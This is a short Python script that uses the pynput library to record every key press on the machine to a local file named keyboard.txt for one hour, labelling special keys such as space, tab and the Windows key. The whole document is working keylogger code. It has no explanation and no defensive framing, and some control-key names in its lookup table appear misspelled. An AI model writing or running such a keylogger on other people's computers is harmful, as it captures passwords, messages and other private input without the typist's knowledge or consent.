from pynput.keyboard import Listener
from datetime import datetime,timedelta


dct={"Key.space":"[space]","Key.tab":"[tab]","Key.crl_l":"[crl_left]","Key.crl_r":"[crl_right]","Key.alt_gr":"[alt_right]","Key.alt_l":
     "[alt_left]","Key.cmd":"[windows]"}
def op(key):
    l = str(key).replace("'"," ")
    if dct.get(l):
        l=dct[l]

    with open ("keyboard.txt","a") as f:
        f.write(l)

start=datetime.now()

end= start + timedelta(hours=1)
def orr(key):
    if datetime.now() >= end:
        return False
    
with Listener(on_press=op,on_release=orr) as l:
    l.join()
